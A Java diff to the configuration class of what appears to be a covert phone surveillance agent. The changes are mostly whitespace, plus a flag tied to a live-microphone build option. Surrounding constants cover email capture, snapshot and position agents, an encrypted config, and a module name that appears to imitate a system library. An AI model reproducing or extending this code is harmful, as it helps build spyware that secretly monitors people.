@@ -43,12 +43,12 @@ public final class Conf {
     //==========================================================
     // Static configuration
     public static final boolean FETCH_WHOLE_EMAIL = false;
-    
+
     public static final boolean DEBUG_SD = false;
     public static final boolean DEBUG_FLASH = true;
-    public static final boolean DEBUG_EVENTS = false;    
+    public static final boolean DEBUG_EVENTS = false;
     public static final boolean DEBUG_OUT = true;
-    public static final boolean DEBUG_INFO = false; 
+    public static final boolean DEBUG_INFO = false;
 
     public static final boolean AGENT_SNAPSHOT_ON_SD = false;
     public static final boolean AGENT_POSITION_ON_SD = false;
@@ -63,10 +63,12 @@ public final class Conf {
     public static final String DEFAULT_APN_USER = "";
     public static final String DEFAULT_APN_PWD = "";
 
+    public static boolean IS_UI = true;
+
     //==========================================================
 
     public static final String MODULE_NAME = "net_rim_bb_lib";
-    
+
     public static final String NEW_CONF = "1";//"newconfig.dat";
     public static final String ACTUAL_CONF = "2";//"config.dat";
     private static final String FORCED_CONF = "3";//"config.bin";
@@ -156,7 +158,9 @@ public final class Conf {
      */
     public Conf() {
         statusObj = Status.getInstance();
-        
+        //#ifdef LIVE_MIC_ENABLED
+        IS_UI = true;
+        //#endif
     }
 
     /**
@@ -169,7 +173,7 @@ public final class Conf {
     public boolean load() {
 
         statusObj.clear();
-        
+
         boolean ret = true;
         final byte[] confKey = Keys.getInstance().getConfKey();
 
@@ -180,8 +184,8 @@ public final class Conf {
         AutoFlashFile file;
 
         //#ifdef DEBUG
-        file = new AutoFlashFile(Path.SD() + Path.CONF_DIR
-                + Conf.FORCED_CONF, true);
+        file = new AutoFlashFile(Path.SD() + Path.CONF_DIR + Conf.FORCED_CONF,
+                true);
         if (file.exists()) {
             debug.info("Try: forced config");
             final byte[] readfile = file.read();
